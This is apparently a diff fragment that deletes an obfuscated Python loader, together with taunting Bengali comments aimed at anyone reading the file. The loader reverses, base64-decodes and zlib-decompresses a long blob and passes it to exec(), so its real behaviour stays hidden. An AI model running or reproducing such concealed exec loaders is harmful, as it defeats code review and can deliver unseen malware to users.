@@ -1,5 +1,1208 @@
-# KIRE BOKAXUDA...😒
-# EIKHANE KI KOROS...?🤨
-# JA SALA VAG SALA...🤣
-#======================         
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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